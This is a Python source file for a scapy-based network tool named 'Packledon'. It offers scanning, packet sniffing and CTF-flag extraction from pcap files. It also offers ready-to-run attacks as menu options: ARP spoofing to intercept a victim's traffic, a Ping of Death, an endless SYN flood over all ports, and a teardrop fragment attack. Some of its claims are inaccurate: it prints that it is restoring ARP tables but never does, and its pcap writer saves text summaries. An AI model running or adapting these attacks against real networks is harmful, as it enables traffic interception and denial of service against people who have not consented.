#imports
from itertools import count
from pyfiglet import Figlet
#import scapy.all as scapy #need scapy for network control/access
from scapy.all import *
import sys
import ipaddress
import dpkt
import subprocess
import re
import base64

#function for arp and ping scanning aka option 1
def arp_and_ping_scanning():
    # Input range or subnet
    target_range = input("Enter the target IP address range or subnet for ARP and Ping scanning (e.g. 192.168.1.0/24): ")
    try:
        network = ipaddress.IPv4Network(target_range, strict=False)
    except ValueError as e:
        print(f"Invalid network: {e}")
        return

    print("Starting ARP Scan...")
    arp_scan_result = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=str(network)), timeout=2, verbose=0)[0]

    print("Starting Ping Scan...")
    ping_scan_result = []
    for ip in network.hosts():  # `hosts()` excludes network and broadcast addresses
        reply = sr1(IP(dst=str(ip))/ICMP(), timeout=2, verbose=0)
        if reply:
            ping_scan_result.append(ip)

    # Display ARP scan results
    if arp_scan_result:
        print("\nARP Scan Results:")
        for sender, target in arp_scan_result:
            print(f"Sender: {sender.psrc}, Target: {target.pdst}")
    else:
        print("No ARP scan results found.")

    # Display Ping scan results
    if ping_scan_result:
        print("\nPing Scan Results (Active Hosts):")
        for ip in ping_scan_result:
            print(f"Host found: {ip}")
    else:
        print("No active hosts found in the Ping scan.")

def scan_ports_nmap():
    """Scans all ports using Nmap (if installed)."""

    nmap_range = input("Enter the victim's IP range: ")  

    try:
        print(f"Running Nmap scan on {nmap_range}...")  # Debugging
        output = subprocess.run(
            ["nmap", "-p-", "-T4", "-oG", "-", nmap_range],
            capture_output=True,
            text=True,
            timeout=30
        )

        print("Raw Nmap output:\n", output.stdout)  # Debugging  

        if output.returncode != 0:
            print(f"Nmap exited with error code {output.returncode}")
            return "Nmap scan failed"

        # Extract open ports
        ports = re.findall(r"(\d+)/open", output.stdout)
        print("Parsed Ports:", ports)  # Debugging  

        return ", ".join(ports) if ports else "No open ports found"

    except subprocess.TimeoutExpired:
        return "Nmap timed out"

    except FileNotFoundError:
        return "Nmap is not installed. Install it with: sudo pacman -S nmap"

    except subprocess.CalledProcessError as e:
        return f"Nmap failed: {e}"

def enter_and_read_pcap():    
    pcap_file_path = input("Enter the PCAP file path: ")
    ctf_prefix = input("Enter the CTF flag prefix (default: CTF): ") or "CTF"
    print(f"Analyzing {pcap_file_path} for CTF flags with prefix '{ctf_prefix}'...")
    
    output_file_path = "packet_analysis.txt"
    found_flags = set()
    packet_count = 0
    protocol_counts = {"TCP": 0, "UDP": 0, "ICMP": 0, "DNS": 0, "ARP": 0, "Other": 0}
    
    # Helper function to extract CTF flags
    def extract_ctf_flags(data):
        flag_pattern = rf"{ctf_prefix}{{[^\}}]+}}"  
        return re.findall(flag_pattern, data)
    
    try:
        # Open the PCAP file
        packets = rdpcap(pcap_file_path)
        total_packets = len(packets)
        
        with open(output_file_path, 'w') as output_file:
            # Write header
            output_file.write(f"ANALYSIS OF PCAP: {pcap_file_path}\n")
            output_file.write("=" * 80 + "\n\n")
            output_file.write(f"Total packets: {total_packets}\n\n")
            
            # Process each packet
            for i, packet in enumerate(packets):
                packet_count += 1
                output_file.write(f"PACKET #{packet_count}\n")
                output_file.write("-" * 40 + "\n")
                
                # Process the packet according to its layers using match-case
                # First handle the Ethernet layer if present
                if Ether in packet:
                    eth = packet[Ether]
                    output_file.write(f"Ethernet: {eth.src} -> {eth.dst}, Type: {hex(eth.type)}\n")
                
                # Use match-case for the network and transport layers
                match packet:
                    case packet if IP in packet:
                        ip = packet[IP]
                        output_file.write(f"IP: {ip.src} -> {ip.dst}, Protocol: {ip.proto}\n")
                        
                        match packet:
                            # TCP traffic
                            case packet if TCP in packet:
                                protocol_counts["TCP"] += 1
                                tcp = packet[TCP]
                                output_file.write(f"TCP: Port {tcp.sport} -> {tcp.dport}\n")
                                
                                flags = tcp.flags
                                flags_str = []
                                if flags & 0x02: flags_str.append("SYN")
                                if flags & 0x10: flags_str.append("ACK")
                                if flags & 0x01: flags_str.append("FIN")
                                if flags & 0x04: flags_str.append("RST")
                                if flags & 0x08: flags_str.append("PSH")
                                if flags & 0x20: flags_str.append("URG")
                                if flags & 0x40: flags_str.append("ECE")
                                if flags & 0x80: flags_str.append("CWR")
                                
                                output_file.write(f"TCP Flags: {', '.join(flags_str) if flags_str else 'None'}\n")
                                
                                if len(bytes(tcp.payload)) > 0:
                                    payload_data = bytes(tcp.payload).decode(errors='ignore')
                                    if len(payload_data.strip()) > 0:
                                        output_file.write(f"TCP Payload: {payload_data[:200]}{'...' if len(payload_data) > 200 else ''}\n")
                                        
                                        flags = extract_ctf_flags(payload_data)
                                        if flags:
                                            found_flags.update(flags)
                                            output_file.write(f"Found CTF Flags: {', '.join(flags)}\n")
                            
                            case packet if UDP in packet:
                                protocol_counts["UDP"] += 1
                                udp = packet[UDP]
                                output_file.write(f"UDP: Port {udp.sport} -> {udp.dport}\n")
                                
                                if len(bytes(udp.payload)) > 0:
                                    payload_data = bytes(udp.payload).decode(errors='ignore')
                                    if len(payload_data.strip()) > 0:
                                        output_file.write(f"UDP Payload: {payload_data[:200]}{'...' if len(payload_data) > 200 else ''}\n")
                                        
                                        flags = extract_ctf_flags(payload_data)
                                        if flags:
                                            found_flags.update(flags)
                                            output_file.write(f"Found CTF Flags: {', '.join(flags)}\n")
                            
                            case packet if ICMP in packet:
                                protocol_counts["ICMP"] += 1
                                icmp = packet[ICMP]
                                output_file.write(f"ICMP: Type {icmp.type}, Code {icmp.code}\n")
                            
                            case _:
                                output_file.write(f"Other IP Protocol: {ip.proto}\n")
                    
                    case packet if ARP in packet:
                        protocol_counts["ARP"] += 1
                        arp = packet[ARP]
                        operation = "request" if arp.op == 1 else "reply" if arp.op == 2 else f"unknown ({arp.op})"
                        output_file.write(f"ARP {operation}: {arp.psrc} -> {arp.pdst}\n")
                    
                    case _:
                        protocol_counts["Other"] += 1
                        output_file.write("Unknown packet type\n")
                
                if DNS in packet:
                    protocol_counts["DNS"] += 1
                    dns = packet[DNS]
                    if packet.haslayer(DNSQR):
                        qname = packet[DNSQR].qname.decode(errors='ignore')
                        output_file.write(f"DNS Query: {qname}\n")
                        
                        flags = extract_ctf_flags(qname)
                        if flags:
                            found_flags.update(flags)
                            output_file.write(f"Found CTF Flags: {', '.join(flags)}\n")
                
                # Raw data analysis
                if Raw in packet:
                    raw_data = packet[Raw].load
                    try:
                        decoded_data = raw_data.decode(errors='ignore')
                        if len(decoded_data.strip()) > 0:
                            # Check for HTTP specifically
                            if b'HTTP' in raw_data or b'GET' in raw_data or b'POST' in raw_data:
                                output_file.write(f"HTTP Data: {decoded_data[:200]}{'...' if len(decoded_data) > 200 else ''}\n")
                            else:
                                output_file.write(f"Raw Data: {decoded_data[:200]}{'...' if len(decoded_data) > 200 else ''}\n")
                            
                            flags = extract_ctf_flags(decoded_data)
                            if flags:
                                found_flags.update(flags)
                                output_file.write(f"Found CTF Flags: {', '.join(flags)}\n")
                    except Exception as e:
                        output_file.write(f"Raw Data: Failed to decode - {e}\n")
                        hex_data = raw_data.hex()
                        output_file.write(f"Raw Data (hex): {hex_data[:200]}{'...' if len(hex_data) > 200 else ''}\n")
                
                output_file.write("\n")
            
            output_file.write("=" * 80 + "\n")
            output_file.write("ANALYSIS SUMMARY\n")
            output_file.write("=" * 80 + "\n\n")
            output_file.write(f"Total packets processed: {packet_count}\n")
            output_file.write("Protocol distribution:\n")
            for protocol, count in protocol_counts.items():
                if count > 0:
                    percentage = (count / packet_count) * 100
                    output_file.write(f"  - {protocol}: {count} packets ({percentage:.1f}%)\n")
            
            output_file.write("\n")
            if found_flags:
                output_file.write("CTF FLAGS FOUND:\n")
                output_file.write("-" * 40 + "\n")
                for flag in sorted(found_flags):
                    output_file.write(f"  - {flag}\n")
            else:
                output_file.write("No CTF flags found.\n")
        
        # Print results to console
        print(f"Analysis completed! Results written to {output_file_path}")
        if found_flags:
            print(f"Found {len(found_flags)} unique CTF flag(s):")
            for flag in sorted(found_flags):
                print(f"  - {flag}")
        else:
            print("No CTF flags found in this capture.")
            
    except FileNotFoundError:
        print(f"Error: File '{pcap_file_path}' not found.")
    except PermissionError:
        print(f"Error: Permission denied for '{pcap_file_path}'.")
    except Exception as e:
        print(f"An error occurred: {e}")
    
    return found_flags

def arp_spoofing_attack():
    victim_ip = input("Enter the victim's IP address: ")
    router_ip = input("Enter the router's IP address: ")

    enable_ip_forwarding = input("Do you want to enable IP forwarding? (yes/no): ").strip().lower()

    def get_mac(ip):
        """
        Sends an ARP request to get the MAC address of a given IP.
        """
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answ = srp(arp_request_broadcast, timeout=1, verbose=False)[0]

        if answ:
            return answ[0][1].hwsrc
        else:
            print(f"[-] Failed to get MAC address for {ip}. Exiting.")
            sys.exit(1)

    def arp_spoofing(target_arp_ip, spoof_ip):
        """
        Creates and sends an ARP spoofing packet to poison the ARP table.
        """
        target_mac = get_mac(target_arp_ip)
        if not target_mac:
            return
        packet = ARP(op=2, pdst=target_arp_ip, hwdst=target_mac, psrc=spoof_ip)
        send(packet, verbose=False)

    def enable_linux_ip_forwarding():
        """ Enables IP forwarding in Linux to allow traffic to pass through. """
        print("[+] Enabling IP forwarding...")
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    def disable_linux_ip_forwarding():
        """ Disables IP forwarding after the attack ends. """
        print("[+] Disabling IP forwarding...")
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

    # Enable IP forwarding if user chose "yes"
    if enable_ip_forwarding == "yes":
        enable_linux_ip_forwarding()

    send_packets_count = 0
    try:
        while True:
            send_packets_count += 2
            arp_spoofing(victim_ip, router_ip)
            arp_spoofing(router_ip, victim_ip)
            print(f"[+] Packets Sent: {send_packets_count}", end="\r")
            sys.stdout.flush()
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[+] Stopping ARP spoofing attack. Restoring ARP tables...")
        if enable_ip_forwarding == "yes":
            disable_linux_ip_forwarding()

def ping_of_death(target_ip):
    print(f"[+] Starting Ping of Death attack on {target_ip}...")
    send( fragment(IP(dst=target_ip)/ICMP()/("X"*65500)), verbose=False)

def tcp_syn_flood(target_ip):
    try:
        print(f"[+] Starting TCP SYN Flood attack on {target_ip}...")
        while True:
            for port in range(1, 65535):
                packet = IP(dst=target_ip)/TCP(dport=port, flags="S")
                send(packet, verbose=False)
    except KeyboardInterrupt:
        print("\n[+] Stopping Dos spoofing attack. Closing the application...")

def dos_attack():
    target_ip = input("Please enter the target IP address for the ping of death attack: ")
    try:
        ping_of_death(target_ip)
        print(f"[+] Ping of Death attack on {target_ip} initiated.")

    except Exception as e:
        print(f"Ping of Death Failed: {e}")

    try:
        tcp_syn_flood(target_ip)
        print(f"[+] TCP SYN Flood attack on {target_ip} initiated. Use ctrl + C to stop the dos from running")

    except Exception as e:
        print(f"TCP SYN Flood Failed: {e}")

def packet_handler(packet):
    """Handles incoming packets and writes them to a file."""
    print(packet.summary())  # Print to console

    try:
        with open("generated.pcap", "a") as f:  # Open in append mode
            f.write(packet.summary() + "\n")  # Write packet details with newline
    except Exception as e:
        print(f"Error writing to file: {e}")

def teardrop_attack():
    target_ip = input("Please enter the target IP address for the teardrop attack: ")
    counter=0
    while counter<200:
        frag1 = IP(dst=target_ip, id=42, frag=0, flags="MF")/UDP()/("X"*2400)
        frag2 = IP(dst=target_ip, id=42, frag=1, flags="MF")/UDP()/("X"*2400)
        send(frag1)
        send(frag2)
        counter=counter+1

def main():
    #create banner
    f = Figlet(font='slant')
    print(f.renderText('Packledon'))
    print("What would you like to do?\n1. Scan for devices on the network\n2. Scan with Nmap\n3. Create a pcap?\n4. Examin a pcap?\n5. Perform an arp spoof attack?\n6. Perform a Dos attack?\n7. Perform a Teardrop attack?")
    user_determination= input("Please enter your selection from the above choices:" )

    print(user_determination)

    if user_determination == "1":
        arp_and_ping_scanning()

    elif user_determination == "2":
        scan_ports_nmap()

    elif user_determination == "3":
        sniff_amount= int(input("Please enter the number of packets you want to capture:" ))
        sniff(prn=packet_handler, count=sniff_amount)

    elif user_determination == "4":
        enter_and_read_pcap()

    elif user_determination == "5":
        arp_spoofing_attack()

    elif user_determination == "6":
        dos_attack()

    elif user_determination == "7":
        teardrop_attack()
    else:
        print("Please enter a valid selection")

if __name__ == "__main__":
    main()
